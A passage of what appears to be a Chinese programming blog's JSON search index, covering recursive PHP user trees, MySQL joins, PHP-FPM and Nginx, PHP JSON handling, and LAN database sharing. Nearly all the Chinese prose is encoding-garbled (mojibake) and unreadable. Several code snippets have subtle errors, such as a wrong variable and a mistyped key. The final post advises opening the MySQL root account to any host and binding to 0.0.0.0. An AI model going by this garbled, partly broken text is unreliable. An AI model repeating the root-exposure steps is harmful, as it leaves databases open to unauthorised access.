¹æ®å·²çŸ¥çš„ä¸€ä¸ªæ•°ä¸€å±‚ä¸€å±‚æŸ¥æ‰¾é™¤æ‰€æœ‰å¯¹åº”ä¸‹çº§ç”¨æˆ·ï¼Œç„¶åå°†ç»“æœæ”¾åœ¨æ•°ç»„ä¸­ã€‚","text":"æœ€è¿‘åœ¨ä¸šåŠ¡ä¸Šé‡åˆ°ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦æ ¹æ®å·²çŸ¥çš„ä¸€ä¸ªæ•°ä¸€å±‚ä¸€å±‚æŸ¥æ‰¾é™¤æ‰€æœ‰å¯¹åº”ä¸‹çº§ç”¨æˆ·ï¼Œç„¶åå°†ç»“æœæ”¾åœ¨æ•°ç»„ä¸­ã€‚ æœ€åè¿”å›çš„ç»“æœå¤§æ¦‚æ˜¯è¿™æ ·ï¼š 1234567891011121314151617181920$result &#x3D; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;php&quot;, &quot;sub_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;python&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ], 1 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;go&quot;, &quot;sup_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;ruby&quot;, &quot;sub_id&quot; &#x3D;&gt; [] ] ] ], ] ]]; è¿™ä¸ªé—®é¢˜çš„éš¾ç‚¹åœ¨äºï¼š æˆ‘å¹¶ä¸çŸ¥é“æœ‰å¤šå°‘ä¸ªä¸‹çº§ ç´¢å¼•æ˜¯æœªçŸ¥çš„ã€‚ å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªæƒ³åˆ°æ˜¯ä½¿ç”¨é€’å½’ç®—æ³•æ¥è§£å†³ã€‚ ä½¿ç”¨é€’å½’ç®—æ³•æ˜¯æ²¡é”™ï¼Œä¸è¿‡æ€è·¯è¿˜æ˜¯æœ‰äº›é—®é¢˜ï¼Œæˆ‘è¯•å›¾é€šè¿‡æ­£å‘æŸ¥æ‰¾ï¼Œç„¶åå°†æ•°æ® push è‡³ç»“æœé›†ã€‚æ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘éœ€è¦çŸ¥é“æ•°ç»„å…·ä½“çš„ç´¢å¼•æ˜¯å¤šå°‘ã€‚ åœ¨ç¬¬ä¸€ä¸ªæ€è·¯æ— è§£ä¹‹åï¼Œæœæ–­æ”¾å¼ƒäº†ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å¾—æ­£å‘æŸ¥æ‰¾ï¼Œé€†å‘å­˜å€¼ã€‚ ä¹Ÿå°±æ˜¯æŠŠé€’å½’è¿”å›çš„ç»“æœå‹å…¥åˆ°å½“å‰ç”¨æˆ·çš„æ•°ç»„ä¸­ï¼Œç„¶åè¿”å›å½“å‰ç”¨æˆ·ï¼Œä»æœ€åä¸€ä¸ªç”¨æˆ·å¾€å‰å¤„ç†ã€‚ æœ€åå®ç°çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213function get_user_tree($user_id)&#123; $result &#x3D; []; &#x2F;&#x2F; todoï¼ˆæ•°æ®æŸ¥è¯¢ï¼‰ &#x2F;&#x2F; éå†æ•°æ® foreach ($data as $item)&#123; $user &#x3D; get_user_tree($item[&#39;user_id&#39;]); $item[&#39;sub_id&#39;] &#x3D; $user; array_push($result, $item); &#125; return $result;&#125; ä¸å¾—ä¸è¯´é€’å½’ç®—æ³•çœŸçš„éå¸¸ä¼˜é›…ï¼Œä»…ä»…ä¸åˆ°åæ¥è¡Œä»£ç å°±æŠŠè¿™ä¸ªå¤æ‚çš„é—®é¢˜ç»™è§£å†³äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Mysql å¤šè¡¨è”æŸ¥","slug":"mysql-multi-table-joint-check","date":"2020-09-24T10:56:22.000Z","updated":"2020-09-24T10:57:00.944Z","comments":true,"path":"mysql-multi-table-joint-check/","link":"","permalink":"https://www.0x2beace.com/mysql-multi-table-joint-check/","excerpt":"Mysql çš„ä¸¤å¼ è¡¨è”è¡¨æŸ¥è¯¢å¯èƒ½å¤§å®¶éƒ½çŸ¥é“æ€ä¹ˆæŸ¥ï¼Œä½†å¦‚æœæ˜¯ä¸‰å¼ è¡¨æˆ–è€…æ˜¯æ›´å¤šå¼ è¡¨å‘¢ï¼Ÿ","text":"Mysql çš„ä¸¤å¼ è¡¨è”è¡¨æŸ¥è¯¢å¯èƒ½å¤§å®¶éƒ½çŸ¥é“æ€ä¹ˆæŸ¥ï¼Œä½†å¦‚æœæ˜¯ä¸‰å¼ è¡¨æˆ–è€…æ˜¯æ›´å¤šå¼ è¡¨å‘¢ï¼Ÿ å…¶å®ä¸ç®¡æ˜¯ä¸¤å¼ è¡¨è¿˜æ˜¯ä¸‰å¼ è¡¨è¿˜æ˜¯N å¼ è¡¨éƒ½æ˜¯ä¸€æ ·çš„ã€‚ å¤šè¡¨è”æŸ¥1234567891011# è¯­æ³•ä¸€ï¼šselect t1.*, t2.*, t3.* from table1 t1, table2 t2, table3 t3where t1.id &#x3D; t2.id and t1.id &#x3D; t3.id;# è¯­æ³•äºŒï¼šselect t1.*, t2.*, t3.* from table t1 inner join table2 t2 on t1.id &#x3D; t2.id inner join table3 t3 on t1.id &#x3D; t3.id; æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š ä¸Šé¢çš„id å¹¶ä¸ä¸€å®šéè¦ä½¿ç”¨idï¼Œå¯ä»¥æ˜¯ä»»ä½•æœ‰å…³è”æ€§çš„å…¶ä»–å­—æ®µ å¦‚æœè¡¨åæ˜¯å…³é”®å­—ï¼Œé‚£ä¹ˆéœ€è¦æŸ¥è¯¢æ—¶åœ¨è¿™ä¸ªå…³é”®å­—ä¸ŠåŠ åå¼•å·ï¼Œå¦‚ï¼š`order` inner join å¯ä»¥æ ¹æ®å®é™…æƒ…å†µå¯ä»¥æ¢æˆleft joinã€right join","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP-FPM ä¸ Nginx æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ","slug":"what-is-the-relationship-between-php-fpm-and-nginx","date":"2020-09-23T14:35:17.000Z","updated":"2020-09-23T14:41:58.011Z","comments":true,"path":"what-is-the-relationship-between-php-fpm-and-nginx/","link":"","permalink":"https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/","excerpt":"æœ€è¿‘éƒ¨ç½²äº†å‡ æ¬¡é¡¹ç›®ï¼Œç»å¸¸é‡åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼šNginx 502 bad gatewayï¼ŒæŸ¥çœ‹ Nginx é”™è¯¯æ—¥å¿—ä¹‹åï¼Œå‘ç°è¿™æ ·ä¸€æ®µè¯ï¼šPrimary script unknownï¼Œæ‰¾äº†å¥½ä¹…çš„ç­”æ¡ˆï¼Œæ€»ç»“å‡ºä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š","text":"æœ€è¿‘éƒ¨ç½²äº†å‡ æ¬¡é¡¹ç›®ï¼Œç»å¸¸é‡åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼šNginx 502 bad gatewayï¼ŒæŸ¥çœ‹ Nginx é”™è¯¯æ—¥å¿—ä¹‹åï¼Œå‘ç°è¿™æ ·ä¸€æ®µè¯ï¼šPrimary script unknownï¼Œæ‰¾äº†å¥½ä¹…çš„ç­”æ¡ˆï¼Œæ€»ç»“å‡ºä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š æœªå¯åŠ¨ Nginx æœªå¯åŠ¨ php-fpm Nginx é…ç½®å¼‚å¸¸ æ–‡ä»¶å¤¹æƒé™ä¸è¶³ å…¶ä¸­æœªå¯åŠ¨ php-fpm æ˜¯å‡ºç°æœ€å¤šçš„é”™è¯¯ï¼Œå†èŠ php-fpm ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥å­¦ä¹ å‡ ä¸ª ç›¸å…³æ¦‚å¿µã€‚ ä»€ä¹ˆæ˜¯ cgiCgi æ˜¯ä¸€ä¸ªåè®®ï¼Œå®ƒçº¦å®šäº† web server å’Œåº”ç”¨ç¨‹åºï¼ˆå¦‚ï¼šPHPã€Pythonç­‰ï¼‰ä¹‹é—´çš„ä¿¡æ¯äº¤æ¢çš„æ ‡å‡†æ ¼å¼ã€‚ é™æ€æ–‡ä»¶å½“ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾è®¿é—®index.htmlè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œé‚£ä¹ˆ web server å°±å›å»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œæœ€åå°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ éé™æ€æ–‡ä»¶å½“ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾è®¿é—®index.phpè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œweb server æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œæ ¹æ®é…ç½®æ–‡ä»¶çŸ¥é“äº†è‡ªå·±å¤„ç†ä¸äº†ï¼Œæ¥ç€è½¬å‘ç»™ç¬¬ä¸‰æ–¹çš„åº”ç”¨ç¨‹åºï¼ˆPHPè§£æå™¨ã€Pythonè§£æå™¨ç­‰ï¼‰ï¼Œweb server çŸ¥é“è¯¥ä¼ å“ªäº›æ•°æ®å—ï¼Ÿå®ƒä¸çŸ¥é“ï¼Œæ‰€ä»¥ Cgi å°±æ˜¯çº¦å®šè¦ä¼ å“ªäº›æ•°æ®ï¼Œä»¥ä»€ä¹ˆæ ·çš„æ ¼å¼ä¼ é€’ç»™ç¬¬ä¸‰æ–¹çš„åº”ç”¨ç¨‹åºçš„åè®®ã€‚ åº”ç”¨ç¨‹åºç‹¬ç«‹å¤„ç†å®Œè¯¥è„šæœ¬ï¼Œç„¶åå†å°†ç»“æœè¿”å›ç»™äº§ç”Ÿå“åº”çš„ web serverï¼Œæœ€åè½¬å‘å“åº”è‡³å®¢æˆ·ç«¯ã€‚ å½“ web server æ”¶åˆ° index.php è¿™ä¸ªè¯·æ±‚ä¹‹åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ cgi ç¨‹åºï¼ˆPHPè§£æå™¨ï¼ŒPythonè§£æå™¨ï¼‰ï¼Œæ¥ä¸‹æ¥è§£æå™¨ä¼šè§£æ php.ini é…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥ cgi è§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ã€‚web server å°†è½¬å‘å“åº”è‡³å®¢æˆ·ç«¯ã€‚ è¿™ç§åè®®çœ‹ä¸Šå»ç®€å•æœ‰æ•ˆï¼Œä½†å®ƒä¹Ÿå­˜åœ¨ä¸€äº›æ˜æ˜¾ä¸è¶³ï¼š æ¯ä¸€ä¸ªè¯·æ±‚äº§ç”Ÿå”¯ä¸€ä¸€ä¸ªè¿›ç¨‹ï¼Œä»ä¸€ä¸ªè¯·æ±‚åˆ°å¦ä¸€ä¸ªè¯·æ±‚ï¼Œå†…å®¹å’Œå…¶ä»–çš„ä¿¡æ¯å…¨éƒ¨ä¸¢å¤±ã€‚ å¼€å¯ä¸€ä¸ªè¿›ç¨‹ä¼šæ¶ˆè€—ç³»ç»Ÿçš„èµ„æºï¼Œå¤§è€Œé‡çš„å¹¶å‘è¯·æ±‚ï¼ˆæ¯äº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼‰æ•°é‡å¾ˆå¿«ä¼šä½¿æœåŠ¡å™¨ä¸€å›¢ç³Ÿã€‚ ä»€ä¹ˆæ˜¯ fastcgiçŸ¥é“äº† cgi æ˜¯åè®®ä¹‹åï¼Œé‚£ fastcgi åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ çŸ¥é“äº† cgi æœåŠ¡å™¨æ€§èƒ½ä½ä¸‹çš„åŸå› æ˜¯å› ä¸ºæ¯äº§ç”Ÿä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šåšåŒæ ·çš„äº‹æƒ…ï¼šè§£æå™¨è§£æé…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œå¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚ fastcgi åˆ™æ˜¯åœ¨ cgi çš„åŸºç¡€ä¸Šåšäº†é‡å¤§çš„æ”¹è¿›ï¼Œä»è€Œè¾¾åˆ°ç›¸åŒçš„ç›®çš„ï¼ŒåŸç†å¦‚ä¸‹ï¼š fgstcgi ä½¿ç”¨äº†èƒ½å¤Ÿå¤„ç†å¤šä¸ªè¯·æ±‚çš„æŒç»­è¿›ç¨‹ï¼Œè€Œä¸æ˜¯é’ˆå¯¹æ¯ä¸ªè¯·æ±‚éƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚ fastcgi æ˜¯ä¸€ä¸ªåŸºäºå¥—æ¥å­—çš„åè®®ï¼Œå› æ­¤å®ƒèƒ½å¤Ÿé€‚ç”¨äºä»»åŠ¡å¹³å°ï¼ˆweb serverï¼‰åŠä»»ä½•ç¼–ç¨‹è¯­è¨€ã€‚ fastcgi çš„æ€§èƒ½ä¹‹æ‰€ä»¥é«˜äº cgiï¼Œæ˜¯å› ä¸º fastcgi å¯ä»¥å¯¹è¿›ç¨‹è¿›è¡Œç®¡ç†ï¼Œè€Œè¿™æ˜¯ cgi æ‰€åšä¸åˆ°çš„ï¼Œä½†å®ƒçš„æœ¬è´¨ä»ç„¶æ˜¯ åè®®ã€‚ ä»€ä¹ˆæ˜¯ php-fpmé»˜è®¤æƒ…å†µä¸‹ï¼ŒPHP æ˜¯æ”¯æŒ cgi å’Œ fastcgi åè®®çš„ã€‚ PHP äºŒè¿›åˆ¶å‘½ä»¤èƒ½å¤Ÿå¤„ç†è„šæœ¬å¹¶ä¸”èƒ½å¤Ÿé€šè¿‡å¥—æ¥å­—ä¸Nginx äº¤äº’ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å¹¶ä¸æ˜¯æ•ˆç‡æœ€é«˜çš„ï¼Œphp-fpm ä¾¿æ˜¯åœ¨è¿™æ ·çš„èƒŒæ™¯ä¸‹è¯ç”Ÿçš„ã€‚ PHP-FPM ï¼ˆPHP FastCgi è¿›ç¨‹ç®¡ç†ï¼ŒPHP Fastcgi Process Managerï¼‰ php-fpm å°† fastcgi å¸¦åˆ°äº†ä¸€ä¸ªå…¨æ–°çš„æ°´å¹³ã€‚ php-fpm å’Œ nginx æœ‰ä»€ä¹ˆè”ç³»åœ¨ç†è§£äº† cgiã€fastcgiã€php-fpm æ˜¯ä»€ä¹ˆä¹‹åï¼Œå°±ä¸éš¾ç†è§£ php-fpm å’Œnginxæ˜¯ä»€ä¹ˆå…³ç³»äº†ã€‚ å› ä¸º php-fpm æ˜¯ php fastcgi çš„è¿›ç¨‹ç®¡ç†å™¨ï¼Œæ‰€ä»¥ php-fpm å°±æ˜¯ nginx ä¸ php äº¤äº’æ—¶ï¼ŒååŠ© php å°†æ€§èƒ½å‘æŒ¥æœ€å¤§çš„ä¸€ä¸ªç¨‹åºã€‚ éš¾æ€ªæ¯æ¬¡ php-fpm è¿™ä¸ªè¿›ç¨‹æ­»æ‰æ—¶ï¼Œnginx çš„çŠ¶æ€å°±å˜æˆäº† 502 ã€‚ å‚è€ƒé“¾æ¥ æä¸æ¸… Fastcgi å’Œ cgi å…³ç³»","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"å¦‚ä½•å°† JSON å¯¹è±¡è½¬æ¢æˆ PHP æ•°ç»„","slug":"how-to-convert-a-json-object-into-a-php-array","date":"2020-09-22T14:58:35.000Z","updated":"2020-09-22T15:00:32.495Z","comments":true,"path":"how-to-convert-a-json-object-into-a-php-array/","link":"","permalink":"https://www.0x2beace.com/how-to-convert-a-json-object-into-a-php-array/","excerpt":"åœ¨ä»‹ç»å¦‚ä½•å°†JSON å­—ç¬¦ä¸²è½¬ä¼ ä¸ºPHP æ•°ç»„ä¹‹å‰ï¼Œå…ˆæ¥å¤ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯JSONã€‚","text":"åœ¨ä»‹ç»å¦‚ä½•å°†JSON å­—ç¬¦ä¸²è½¬ä¼ ä¸ºPHP æ•°ç»„ä¹‹å‰ï¼Œå…ˆæ¥å¤ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯JSONã€‚ JSONé€šä¿—ä¸€ç‚¹è®²JSON å°±æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå°±æ˜¯ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œåªä¸è¿‡å…ƒç´ ä¼šé€šè¿‡ç‰¹å®šçš„ç¬¦å·æ ‡æ³¨ã€‚ {}ï¼šå¤§æ‹¬å·è¡¨ç¤ºå¯¹è±¡ []ï¼šä¸­æ‹¬å·è¡¨ç¤ºæ•°ç»„ &quot;&quot;ï¼šåŒå¼•å·å†…æ˜¯å±æ€§æˆ–å€¼ æ ‡å‡†çš„JSON å¯¹è±¡ï¼š 123456# è¿™æ˜¯ä¸€ä¸ªJSON å¯¹è±¡&#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25&#125; æ ‡å‡†çš„JSON æ•°ç»„ï¼š 123456789101112131415161718# è¿™æ˜¯ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªå¯¹è±¡çš„JSON æ•°ç»„[ &#123; &quot;name&quot;: &quot;boo&quot;, &quot;gender&quot;: &quot;men&quot;, &quot;age&quot;: 25 &#125;, &#123; &quot;name&quot;: &quot;max&quot;, &quot;gender&quot;: &quot;men&quot;,, &quot;age&quot;: 29 &#125;]# è¿™æ˜¯ä¸€ä¸ªåŒ…å«æ•°ç»„çš„JSON å¯¹è±¡&#123; &quot;name&quot;:[&quot;Michael&quot;,&quot;Jerry&quot;]&#125; åœ¨ç†Ÿæ‚‰äº†å‡ ç§å¸¸è§çš„JSON å­—ç¬¦ä¸²ä¹‹åï¼Œåœ¨æ¥çœ‹ä¸€ä¸‹å¦‚ä½•è§£æJSON å­—ç¬¦ä¸²ã€‚ json_decodeJSON å¯¹è±¡è½¬æ¢ä¸ºå¯¹è±¡ 123456789101112131415161718&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$obj &#x3D; json_decode($jsonObj);print $obj-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;boo$jsonObj2 &#x3D; &#39;[&#123;&quot;name&quot;: &quot;boo&quot;&#125;]&#39;;$obj2 &#x3D; json_decode($jsonObj2);print $obj[0]-&gt;&#123;&quot;name&quot;&#125;; &#x2F;&#x2F;booobject(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)array (size&#x3D;1) 0 &#x3D;&gt; object(stdClass)[1] public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) JSON å¯¹è±¡è½¬æ¢ä¸ºæ•°ç»„ 12345678&lt;?php$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;$arr &#x3D; json_decode($jsonObj, true);print $arr[&#39;name&#39;]; &#x2F;&#x2F;booarray (size&#x3D;1) &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3) éœ€è¦æ³¨æ„å‡ ä¸ªå®¹æ˜“å‡ºé”™çš„ç»†èŠ‚ï¼š 123456789101112&lt;?php&#x2F;&#x2F; å¤§æ‹¬å·å¤–éœ€è¦ä½¿ç”¨å•å¼•å·$bad_json &#x3D; &quot;&#123; &#39;bar&#39;: &#39;baz&#39; &#125;&quot;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; å±æ€§éœ€è¦ä½¿ç”¨åŒå¼•å·å¼•èµ·æ¥$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot; &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null&#x2F;&#x2F; ä¸å…è®¸å°¾éšé€—å·$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot;, &#125;&#39;;json_decode($bad_json); &#x2F;&#x2F; null json_encodeä¸‹é¢æ¥çœ‹çœ‹å¦‚ä½•è¿”å›JSON æ ¼å¼çš„æ•°æ®ï¼Œé€šè¿‡ä½¿ç”¨ json_encodeè¿™ä¸ªå‡½æ•°ï¼š 123456789101112131415161718192021222324252627$b &#x3D; array();echo &quot;ç©ºæ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡º: &quot;, json_encode($b), &quot;\\n&quot;; &#x2F;&#x2F;ç©ºæ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡ºï¼š[]echo &quot;ç©ºæ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($b, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;ç©ºæ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&#125;$c &#x3D; array(array(1,2,3));echo &quot;å¤šç»´æ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡º: &quot;, json_encode($c), &quot;\\n&quot;; &#x2F;&#x2F;å¤šç»´æ•°ç»„ä½œä¸ºæ•°ç»„è¾“å‡ºï¼š[[1,2,3]]echo &quot;å¤šç»´æ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($c, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;å¤šç»´æ•°ç»„ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&quot;0&quot;:&#123;&quot;0&quot;:1,&quot;1&quot;:2,&quot;2&quot;:3&#125;&#125;$d &#x3D; array(&#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;baz&#39; &#x3D;&gt; &#39;long&#39;);echo &quot;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($d), &quot;\\n&quot;; &#x2F;&#x2F;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;echo &quot;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡º: &quot;, json_encode($d, JSON_FORCE_OBJECT), &quot;\\n\\n&quot;; &#x2F;&#x2F;å…³è”æ•°ç»„åªèƒ½ä½œä¸ºå¯¹è±¡è¾“å‡ºï¼š&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;$arr &#x3D; array( &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;gender&quot; &#x3D;&gt; &quot;men&quot;, &quot;age&quot; &#x3D;&gt; 22);$res &#x3D; json_encode($arr);var_dump($res);echo($res);string &#39;&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;&#39; (length&#x3D;35)&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"åŒä¸€å±€åŸŸç½‘å†…å¦‚ä½•è®¿é—®é¡¹ç›®åœ°å€ã€è¿æ¥ Mysql","slug":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network","date":"2020-09-21T13:42:44.000Z","updated":"2020-09-23T14:46:39.880Z","comments":true,"path":"how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/","excerpt":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œåœ¨å›¢é˜Ÿé¡¹ç›®å¼€å‘ä¸­è¿™æ˜¯ä¸¤ä¸ªå¾ˆå¸¸è§çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œåœ¨å›¢é˜Ÿé¡¹ç›®å¼€å‘ä¸­è¿™æ˜¯ä¸¤ä¸ªå¾ˆå¸¸è§çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚ å±€åŸŸç½‘å†…å…±äº«é¡¹ç›®åœ°å€æœ‰æ—¶å€™ä¼šæœ‰è¿™æ ·ä¸€ç§éœ€æ±‚ï¼Œè‡ªå·±åœ¨æœ¬åœ°é¡¹ç›®åšå¼€å‘ï¼Œè¿˜æ²¡æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯å…¶ä»–äººå¸Œæœ›èƒ½åœ¨ä»–çš„ç”µè„‘ä¸Šè®¿é—®é¡¹ç›®ã€‚ è¿™ä¸ªæ—¶å€™å°±éœ€è¦è¿™ä¸¤å°ç”µè„‘åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œä¹Ÿå°±æ˜¯è¿æ¥ç›¸åŒçš„WiFi ã€‚ ç„¶åæŸ¥çœ‹è‡ªå·±çš„å¤–ç½‘IP åœ°å€æ˜¯å¤šå°‘ï¼š 12345# mac&#x2F;linuxifconfig# windowsipconfig å¤–ç½‘IP åœ°å€é€šå¸¸æ˜¯ä»¥192.168.x.xxxæ‰“å¤´çš„IP ï¼Œç„¶åæŠŠè¿™ä¸ªIP é…ç½®åˆ°å¯¹åº”çš„åŸŸåã€‚ 123456789# mac&#x2F;linuxvim &#x2F;usr&#x2F;etc&#x2F;hosts# windowsC:\\Windows\\ System32 \\drivers\\etc\\hosts# hosts 127.0.0.1 example.com192.168.x.xxx example.com é…ç½®å®Œæˆä¹‹åï¼Œç›´æ¥æŠŠexample.comè¿™ä¸ªåŸŸåä¸¢ç»™å¯¹æ–¹ï¼Œå¯¹æ–¹å°±åœ¨ä»–è‡ªå·±çš„ç”µè„‘ä¸Šå¯ä»¥è®¿é—®äº†ã€‚ å±€åŸŸç½‘å†…è¿æ¥Mysqlæƒ³è¦åœ¨å±€åŸŸç½‘å†…ï¼Œè®©åˆ«äººèƒ½è¿æ¥åˆ°æˆ‘çš„æ•°æ®åº“ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š å¯¹æœ¬åœ°Mysql æˆæƒï¼Œå…è®¸å…¶ä»–ç”¨æˆ·è¿æ¥ Mysql å¼€æ”¾å¤–ç½‘è®¿é—® å¯¹äºç¬¬ä¸€ç‚¹ï¼Œå¯ä»¥ä»¥ä¸‹å‘½ä»¤æ¥å®Œæˆï¼š 123451. mysql -hlocalhost -uroot -p;2. use mysql;# ä¿®æ”¹æƒé™ï¼Œå…è®¸å…¶ä»–äººè¿æ¥ï¼š3. update user set host&#x3D;&#39;%&#39; where user&#x3D;&quot;root&quot;;4. flush privileges; é€šå¸¸å®Œæˆç¬¬ä¸€æ­¥ï¼Œå°±å¯ä»¥è¿æ¥äº†ï¼Œå¦‚æœè¿æ¥å¼‚å¸¸ï¼Œå¯ä»¥å°è¯•ç¬¬äºŒæ­¥ï¼š 12345# æ‰“å¼€Mysql é…ç½®æ–‡ä»¶vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnfbind-address &#x3D; 0.0.0.0# 127.0.0.1 æ›¿æ¢æˆ 0.0.0.0; ç„¶åé‡å¯Mysql æ•°æ®åº“å³å¯ã€‚ å…¶ä»–äººæ€ä¹ˆè¿æ¥æˆ‘çš„æ•°æ®åº“ï¼Ÿ æŠŠè¿™ä¸ªä¸¢ç»™ä»–ï¼š 123hostï¼šä½ çš„å¤–ç½‘IP åœ°å€userï¼šä½ çš„Mysql ç”¨æˆ·pwdï¼šä½ çš„Mysql å¯†ç 